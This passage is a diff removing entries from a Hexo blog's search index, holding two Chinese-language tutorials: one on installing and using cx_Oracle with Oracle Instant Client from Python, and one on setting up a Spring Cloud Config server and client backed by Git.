@@ -1,311 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Python使用cx_Oracle操作Oracle数据库</title>
-    <url>/2018/02/12/Python%E4%BD%BF%E7%94%A8cx-Oracle%E6%93%8D%E4%BD%9COracle%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
-    <content><![CDATA[<p>本文主要记录Python使用cx_Oracle组件操作Oracle数据库的过程。</p>
-<span id="more"></span>
-
-<h2 id="–-gt-Windows"><a href="#–-gt-Windows" class="headerlink" title="–&gt; Windows"></a>–&gt; Windows</h2><h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><ul>
-<li>OS：Windows 7 64bit</li>
-<li>Python：2.7.14 64bit</li>
-<li>cx_Oracle：6.1-cp27-cp27m-win_amd64</li>
-<li>instantclient：basic-windows.x64-12.2.0.1.0</li>
-</ul>
-<h3 id="安装cx-Oracle"><a href="#安装cx-Oracle" class="headerlink" title="安装cx_Oracle"></a>安装cx_Oracle</h3><h4 id="pip安装"><a href="#pip安装" class="headerlink" title="pip安装"></a>pip安装</h4><ul>
-<li>使用如下指令安装cx_Oracle<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install cx_Oracle</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h4 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h4><ul>
-<li>打开 <a href="https://pypi.python.org/pypi/cx_Oracle">https://pypi.python.org/pypi/cx_Oracle</a>    </li>
-<li>下载cx_Oracle-6.1-cp27-cp27m-win_amd64.whl文件      </li>
-<li>使用如下指令安装whl文件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install cx_Oracle-6.1-cp27-cp27m-win_amd64.whl</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="安装Oralce客户端"><a href="#安装Oralce客户端" class="headerlink" title="安装Oralce客户端"></a>安装Oralce客户端</h3><ul>
-<li>打开 <a href="http://www.oracle.com/technetwork/topics/winx64soft-089540.html">http://www.oracle.com/technetwork/topics/winx64soft-089540.html</a>     </li>
-<li>下载instantclient-basic-windows.x64-12.2.0.1.0.zip文件   </li>
-<li>解压zip文件       </li>
-<li>将解压目录添加为环境变量ORACLE_HOME       </li>
-<li>将环境变量ORACLE_HOME添加到环境变量Path       </li>
-</ul>
-<h2 id="–-gt-Linux"><a href="#–-gt-Linux" class="headerlink" title="–&gt; Linux"></a>–&gt; Linux</h2><h3 id="环境信息-1"><a href="#环境信息-1" class="headerlink" title="环境信息"></a>环境信息</h3><ul>
-<li>OS：Linux dsic1h1 3.10.0-229.x86_64 </li>
-<li>Python：2.7.14 64bit</li>
-<li>cx_Oracle：6.1-cp27-cp27m-manylinux1_x86_64.whl</li>
-<li>instantclient：basic-linux.x64-12.2.0.1.0</li>
-</ul>
-<h3 id="安装cx-Oracle-1"><a href="#安装cx-Oracle-1" class="headerlink" title="安装cx_Oracle"></a>安装cx_Oracle</h3><h4 id="pip安装-1"><a href="#pip安装-1" class="headerlink" title="pip安装"></a>pip安装</h4><ul>
-<li>使用如下指令安装cx_Oracle<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install cx_Oracle</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h4 id="手动安装-1"><a href="#手动安装-1" class="headerlink" title="手动安装"></a>手动安装</h4><ul>
-<li>打开 <a href="https://pypi.python.org/pypi/cx_Oracle">https://pypi.python.org/pypi/cx_Oracle</a>    </li>
-<li>下载cx_Oracle-6.1-cp27-cp27m-manylinux1_x86_64.whl文件      </li>
-<li>上传并使用如下指令安装whl文件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install cx_Oracle-6.1-cp27-cp27m-manylinux1_x86_64.whl</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="安装Oralce客户端-1"><a href="#安装Oralce客户端-1" class="headerlink" title="安装Oralce客户端"></a>安装Oralce客户端</h3><ul>
-<li>打开 <a href="http://www.oracle.com/technetwork/topics/linuxx86-64soft-092277.html">http://www.oracle.com/technetwork/topics/linuxx86-64soft-092277.html</a>     </li>
-<li>下载instantclient-basic-linux.x64-12.2.0.1.0.zip文件   </li>
-<li>上传并解压zip文件       </li>
-<li>新增环境变量LD_LIBRARY_PATH<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 可将以下记录写入环境变量配置文件，如~/.bashrc，~/.profile</span><br><span class="line"># 其中/tmp/instantclient_12_2为instantclient解压目录</span><br><span class="line"></span><br><span class="line">export LD_LIBRARY_PATH=$&#123;LD_LIBRARY_PATH&#125;:/tmp/instantclient_12_2       </span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="–-gt-Python下执行测试验证"><a href="#–-gt-Python下执行测试验证" class="headerlink" title="–&gt; Python下执行测试验证"></a>–&gt; Python下执行测试验证</h2><ul>
-<li>相关代码如下<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import cx_Oracle  </span><br><span class="line">dsn = cx_Oracle.makedsn(&quot;192.168.0.233&quot;,            # 数据库主机IP</span><br><span class="line">                        1521,                       # 数据库服务端口</span><br><span class="line">                        &quot;SID&quot;)                      # 数据库实例SID</span><br><span class="line">conn = cx_Oracle.connect(&quot;username&quot;,                # 连接用户</span><br><span class="line">                         &quot;passwd&quot;,                  # 用户密码</span><br><span class="line">                         dsn)                       </span><br><span class="line">curs = conn.cursor()  </span><br><span class="line">sql = &quot;select * from TBL_NAME where rownum&lt;10&quot;</span><br><span class="line">rr = curs.execute(sql)  </span><br><span class="line">row = curs.fetchone()  </span><br><span class="line">print row[0]  </span><br><span class="line">curs.close()                                                  </span><br><span class="line">conn.close()  </span><br></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
-      <tags>
-        <tag>Python</tag>
-        <tag>Oracle</tag>
-        <tag>cx_Oracle</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SpringCloud笔记：统一配置中心</title>
-    <url>/2018/12/04/Spring-Cloud-Config/</url>
-    <content><![CDATA[<p>SpringCloud笔记：统一配置中心入门。</p>
-<span id="more"></span>
-
-
-<p>对于配置的重要性，我想我不用进行任何强调，大家都可以明白其重要性。在普通单体应用，我们常使用配置文件(application(*).properties(yml))管理应用的所有配置。这些配置文件在单体应用中非常胜任其角色，并没有让我们感觉到有头疼的地方。但随着微服务框架的引入，微服务数量就会在我们产品中不断增加，之前我们重点考虑的是系统的可伸缩、可扩展性好，但随之就是配置管理的问题就会一一暴露出来。起初微服务器各自管各自的配置，在开发阶段并没什么问题，但到了生产环境管理就会很头疼，如果要大规模更新某项配置，困难就可想而知。<br>为此，在分布式系统中，Spring Cloud提供一个Config子项目，该项目核心就是配置中心，通过一个服务端和多个客户端实现配置服务。我们可使用配置服务器集中的管理所有服务的各种环境配置文件。配置服务中心默认采用Git的方式进行存储，因此我们很容易部署修改，并可以对环境配置进行版本管理。</p>
-<h1 id="Spring-Cloud-Config特点"><a href="#Spring-Cloud-Config特点" class="headerlink" title="Spring Cloud Config特点"></a>Spring Cloud Config特点</h1><p>Spring Cloud Config具有中心化、版本控制、支持动态更新和语言独立等特性。其特点是:</p>
-<ul>
-<li>提供服务端和客户端支持(Spring Cloud Config Server和Spring Cloud Config Client);</li>
-<li>集中式管理分布式环境下的应用配置;</li>
-<li>基于Spring环境，实现了与Spring应用无缝集成;</li>
-<li>可用于任何语言开发的程序;</li>
-<li>默认实现基于Git仓库(也支持SVN)，从而可以进行配置的版本管理;</li>
-</ul>
-<h1 id="Spring-Cloud-Config结构图"><a href="#Spring-Cloud-Config结构图" class="headerlink" title="Spring Cloud Config结构图"></a>Spring Cloud Config结构图</h1><p><img src="/images/SpringCloudConfig-%E7%BB%93%E6%9E%84%E5%9B%BE.png" alt="&quot;Config-结构图&quot;"></p>
-<p>从图中可以看出Spring Cloud Config有两个角色(类似Eureka): Server和Client。Spring Cloud Config Server作为配置中心的服务端承担如下作用:</p>
-<ul>
-<li>拉取配置时更新Git仓库副本，保证是配置为最新;</li>
-<li>支持从yml、json、properties等文件加载配置;</li>
-<li>配合Eureke可实现服务发现，配合Cloud Bus(这个后面我们在详细说明)可实现配置推送更新;</li>
-<li>默认配置存储基于Git仓库(可以切换为SVN)，从而支持配置的版本管理.</li>
-<li>而对于，Spring Cloud Config Client则非常方便，只需要在启动配置文件中增加使用Config Server上哪个配置文件即可。</li>
-</ul>
-<h1 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h1><h2 id="构建Config-Server"><a href="#构建Config-Server" class="headerlink" title="构建Config-Server"></a>构建Config-Server</h2><h3 id="编写pom-xml文件"><a href="#编写pom-xml文件" class="headerlink" title="编写pom.xml文件"></a>编写pom.xml文件</h3><p>Config-Server是一个标准的Spring Boot应用，所以pom.xml也是继承之前的Parent：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>twostepsfromjava.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>twostepsfromjava-cloud-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">relativePath</span>&gt;</span>../parent<span class="tag">&lt;/<span class="name">relativePath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>config-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Spring Cloud Sample Projects: Config Server<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-config-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="编写启动类"><a href="#编写启动类" class="headerlink" title="编写启动类"></a>编写启动类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * TwoStepsFromJava Cloud -- Config Server</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> CD826(CD826Dong@gmail.com)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.0.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableConfigServer</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里最重要的就是增加@EnableConfigServer，其它与之前的应用一致。</p>
-<h3 id="编写配置文件"><a href="#编写配置文件" class="headerlink" title="编写配置文件"></a>编写配置文件</h3><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">server.port=8280</span></span><br><span class="line"></span><br><span class="line"><span class="string">spring.application.name=config-server</span></span><br><span class="line"></span><br><span class="line"><span class="string">spring.cloud.config.server.git.uri=https://github.com/cd826/SpringcloudSamplesConfig</span></span><br><span class="line"><span class="string">spring.cloud.config.server.git.username=your</span> <span class="string">git</span> <span class="string">username</span></span><br><span class="line"><span class="string">spring.cloud.config.server.git.password=your</span> <span class="string">git</span> <span class="string">password</span></span><br></pre></td></tr></table></figure>
-<p>这里最重要的是需要配置Git仓库的地址及登录用户名和口令。</p>
-<h3 id="创建测试配置文件"><a href="#创建测试配置文件" class="headerlink" title="创建测试配置文件"></a>创建测试配置文件</h3><p>我们在SpringcloudSamplesConfig仓库中增加量个配置文件。</p>
-<p>mallWeb.properties，文件内容如下:</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">foo</span> <span class="string">=</span> <span class="string">bar</span></span><br></pre></td></tr></table></figure>
-<p>mallWeb-dev.properties，文件内容如下:</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">bar</span> <span class="string">=</span> <span class="string">cd826</span></span><br></pre></td></tr></table></figure>
-<p>注意：这里编写文件后记得提交，否则会测试失败。</p>
-<h3 id="启动测试"><a href="#启动测试" class="headerlink" title="启动测试"></a>启动测试</h3><p>启动config-server. 在终端中我们输入以下命令(或者使用postman):</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl localhost:8280/mallWeb/dev</span><br></pre></td></tr></table></figure>
-<p>在终端中会输出以下内容:</p>
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;mallWeb&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;profiles&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;dev&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;label&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">&quot;state&quot;</span>: <span class="literal">null</span>,</span><br><span class="line">    <span class="attr">&quot;propertySources&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;https://github.com/cd826/SpringcloudSamplesConfig/mallWeb-dev.properties&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;source&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;bar&quot;</span>: <span class="string">&quot;cd826&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;https://github.com/cd826/SpringcloudSamplesConfig/mallWeb.properties&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;source&quot;</span>: &#123;</span><br><span class="line">                <span class="attr">&quot;foo&quot;</span>: <span class="string">&quot;bar&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里可以看到，我们提交到Git中的配置文件已经能够被config-server正确的读取到。</p>
-<h3 id="config-server默认配置"><a href="#config-server默认配置" class="headerlink" title="config-server默认配置"></a>config-server默认配置</h3><p>当我们查看源码会发现在spring-cloud-config-server.jar包中有一个默认配置文件configserver.yml配置文件，也就是说当我们设置spring.application.name=configserver时，就会默认加载该配置文件，该配置文件内容如下:</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">info:</span></span><br><span class="line">  <span class="attr">component:</span> <span class="string">Config</span> <span class="string">Server</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">configserver</span></span><br><span class="line">  <span class="attr">jmx:</span></span><br><span class="line">    <span class="attr">default_domain:</span> <span class="string">cloud.config.server</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">config:</span></span><br><span class="line">      <span class="attr">server:</span></span><br><span class="line">        <span class="attr">git:</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">https://github.com/spring-cloud-samples/config-repo</span></span><br><span class="line">          <span class="attr">repos:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">patterns:</span> <span class="string">multi-repo-demo-*</span></span><br><span class="line">              <span class="attr">uri:</span> <span class="string">https://github.com/spring-cloud-samples/config-repo</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8888</span></span><br><span class="line"><span class="attr">management:</span></span><br><span class="line">  <span class="attr">context_path:</span> <span class="string">/admin</span></span><br></pre></td></tr></table></figure>
-<p>默认使用8888端口，并且从<a href="https://github.com/spring-cloud-samples/config-repo%E8%BF%99%E4%B8%AAGit%E4%BB%93%E5%BA%93%E4%B8%AD%E6%9F%A5%E6%89%BE%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E3%80%82">https://github.com/spring-cloud-samples/config-repo这个Git仓库中查找配置文件。</a></p>
-<p>因为，在上面的示例中我们重新定义了应用名称和服务端口。</p>
-<h2 id="构建config-client"><a href="#构建config-client" class="headerlink" title="构建config-client"></a>构建config-client</h2><p>config-client可以是任何一个基于Spring boot的应用，这里为了讲解方便，我们构建一个非常简单的web工程。</p>
-<h3 id="编写pom-xml文件-1"><a href="#编写pom-xml文件-1" class="headerlink" title="编写pom.xml文件"></a>编写pom.xml文件</h3><p>我们的config-client项目需要引入对spring-cloud-starter-config的依赖，如下：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>twostepsfromjava.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>twostepsfromjava-cloud-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">relativePath</span>&gt;</span>../parent<span class="tag">&lt;/<span class="name">relativePath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>config-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>Spring Cloud Sample Projects: Config Client<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-config<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="编写启动类-1"><a href="#编写启动类-1" class="headerlink" title="编写启动类"></a>编写启动类</h3><p>一个标准的Spring Boot启动类:</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * TwoStepsFromJava Cloud -- Config Client Project</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> CD826(CD826Dong@gmail.com)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.0.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(Application.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="编写测试Controller"><a href="#编写测试Controller" class="headerlink" title="编写测试Controller"></a>编写测试Controller</h3><p>这个测试Controller主要就是验证我们可以从Git仓库中获取配置内容。</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Config Client Test Controller</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> CD826(CD826Dong@gmail.com)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.0.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/cfg&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConfigController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;foo&#125;&quot;)</span></span><br><span class="line">    String foo;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;bar&#125;&quot;)</span></span><br><span class="line">    String bar;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/foo&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> foo + <span class="string">&quot;——&quot;</span> + bar;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="编写配置文件-1"><a href="#编写配置文件-1" class="headerlink" title="编写配置文件"></a>编写配置文件</h3><p>这里编写的配置文件名称为:bootstrap.properties，内容如下:</p>
-<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">server.port=8080</span></span><br><span class="line"></span><br><span class="line"><span class="string">spring.application.name=mallWeb</span></span><br><span class="line"><span class="string">spring.cloud.config.profile=dev</span></span><br><span class="line"><span class="string">spring.cloud.config.uri=</span> <span class="string">http://localhost:8280/</span></span><br></pre></td></tr></table></figure>
-<p>定义了微服务的名称和profile以及配置服务器的地址。</p>
-<p>注意: 这些配置不能够配置在application.properties文件中，因为在Spring Boot启动时有引导上下文和应用上下文的概念，只有将配置服务器信息定义在引导上下文中，才能够从配置服务器中获取到配置信息。否则，服务启动时会报找不到foo变量定义的错误。</p>
-<h3 id="启动测试-1"><a href="#启动测试-1" class="headerlink" title="启动测试"></a>启动测试</h3><p>启动后我们可以访问：<a href="http://localhost:8080/cfg/foo%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%A6%82%E4%B8%8B%E7%95%8C%E9%9D%A2%EF%BC%9A">http://localhost:8080/cfg/foo，可以看到如下界面：</a></p>
-<p>Config-010<br>说明，我们的config-client已经成功从config-server上获取到配置的数据了。</p>
-<h2 id="Spring项目配置加载顺序"><a href="#Spring项目配置加载顺序" class="headerlink" title="Spring项目配置加载顺序"></a>Spring项目配置加载顺序</h2><ul>
-<li>这里是列表文本命令行参数</li>
-<li>SPRING_APPLICATION_JSON 参数</li>
-<li>从java:comp/env 加载 JNDI 属性</li>
-<li>Java系统属性 （System.getProperties()）</li>
-<li>操作系统环境变量</li>
-<li>如果有使用 random.* 属性配置，则使用 RandomValuePropertySource 产生</li>
-<li>外部特定应用配置文件 例如：application-{profile}.properties 或者 YAML variants</li>
-<li>内部特定应用配置文件 例如：application-{profile}.properties 或者 YAML variants</li>
-<li>外部应用配置文件 例如：application.properties 或者 YAML variants</li>
-<li>内部应用配置文件 例如：application.properties 或者 YAML variants</li>
-<li>加载@Configuration类的 @PropertySource 或者 @ConfigurationProperties 指向的配置文件</li>
-<li>默认配置，通过SpringApplication.setDefaultProperties 设置         </li>
-</ul>
-<h2 id="配置规则详解"><a href="#配置规则详解" class="headerlink" title="配置规则详解"></a>配置规则详解</h2><p>下面我们来看一看Config Client从Config Server中获取配置数据的流程:</p>
-<ul>
-<li>Config Client启动时，根据bootstrap.properties中配置的应用名称(application)、环境名(profile)和分支名(label)，向Config Server请求获取配置数据;</li>
-<li>Config Server根据Config Client的请求及配置，从Git仓库(这里以Git为例)中查找符合的配置文件;</li>
-<li>Config Server将匹配到的Git仓库拉取到本地，并建立本地缓存;</li>
-<li>Config Server创建Spring的ApplicationContext实例，并根据拉取的配置文件，填充配置信息，然后将该配置信息返回给Config Client;</li>
-<li>Config Client获取到Config Server返回的配置数据后，将这些配置数据加载到自己的上下文中。同时，因为这些配置数据的优先级高于本地Jar包中的配置，因此将不再加载本地的配置。</li>
-</ul>
-<p>那么，Config Server又是如何与Git仓库中的配置文件进行匹配的呢？通常，我们会为一个项目建立类似如下的配置文件:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mallweb.properties: 基础配置文件;</span><br><span class="line">mallweb-dev.properties: 开发使用的配置文件;</span><br><span class="line">mallweb-test.properties: 测试使用的配置文件;</span><br><span class="line">mallweb-prod.properties: 生产环境使用的配置文件;</span><br></pre></td></tr></table></figure>
-<p>当我们访问Config Server的端点时，就会按照如下映射关系来匹配相应的配置文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/&#123;application&#125;/&#123;profile&#125;[/&#123;label&#125;]</span><br><span class="line">/&#123;application&#125;-&#123;profile&#125;.yml</span><br><span class="line">/&#123;label&#125;/&#123;application&#125;-&#123;profile&#125;.yml</span><br><span class="line">/&#123;application&#125;-&#123;profile&#125;.properties</span><br><span class="line">/&#123;label&#125;/&#123;application&#125;-&#123;profile&#125;.properties</span><br><span class="line">上面的Url将会映射为格式为:&#123;application&#125;-&#123;profile&#125;.properties(yml)的配置文件。另外，label则对应Git上分支名称，是一个可选参数，如果没有则为默认的master分支。</span><br></pre></td></tr></table></figure>
-
-<p>而Config-Client的bootstrap.properties配置对应如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spring.application.name &lt;==&gt; application;</span><br><span class="line">spring.cloud.config.profile &lt;==&gt; profile;</span><br><span class="line">spring.cloud.config.label &lt;==&gt; label.</span><br></pre></td></tr></table></figure>
-<p>2.1 Git仓库配置<br>Config Server默认使用的就是Git，所以配置也非常简单，如上面的配置</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(application.properties):</span><br><span class="line"></span><br><span class="line">spring.cloud.config.server.git.uri=http://</span><br><span class="line">spring.cloud.config.server.git.username=username</span><br><span class="line">spring.cloud.config.server.git.password=password</span><br></pre></td></tr></table></figure>
-<p>那么客户端在请求时服务端就会到该仓库中进行查找。</p>
-<p>2.1.1 使用占位符<br>在服务端配置中我们也可以使用{application}、{profile} 和 {label}占位符，如下:</p>
-<p>spring.cloud.config.server.git.uri=<a href="http://github.com/cd826/%7Bapplication%7D">http://github.com/cd826/{application}</a><br>spring.cloud.config.server.git.username=username<br>spring.cloud.config.server.git.password=password<br>这样，我们就可以为每一个应用客户端创建一个单独的仓库。</p>
-<p>这里需要注意的是，如果Git的分支或标签中包含”/“时，在{label}参数中需要使用”(_)”替代，这个主要是避免与Http URL转义符处理的冲突。</p>
-<p>2.1.2 使用模式匹配<br>我们也可以使用{application}/{profile}进行模式匹配，以便获取到相应的配置文件。配置示例如下:</p>
-<p>spring.cloud.config.server.git.uri=<a href="https://github.com/spring-cloud-samples/config-repo">https://github.com/spring-cloud-samples/config-repo</a></p>
-<p>spring.cloud.config.server.git.repos.simple=<a href="https://github.com/simple/config-repo">https://github.com/simple/config-repo</a></p>
-<p>spring.cloud.config.server.git.repos.special.pattern=special*/dev*,<em>special</em>/dev*<br>spring.cloud.config.server.git.repos.special.uri=<a href="https://github.com/special/config-repo">https://github.com/special/config-repo</a></p>
-<p>spring.cloud.config.server.git.repos.local.pattern=local*<br>spring.cloud.config.server.git.repos.local.uri=file:/home/configsvc/config-repo<br>如果模式中需要配置多个值，那么可以使用逗号分隔。</p>
-<p>如果{application}/{profile}没有匹配到任何资源，则使用spring.cloud.config.server.git.uri配置的默认URI。</p>
-<p>当我们使用yml类型的文件进行配置时，如果模式属性是一个YAML数组，也可以使用YAML数组格式来定义。这样可以设置成多个配个配置文件，如:</p>
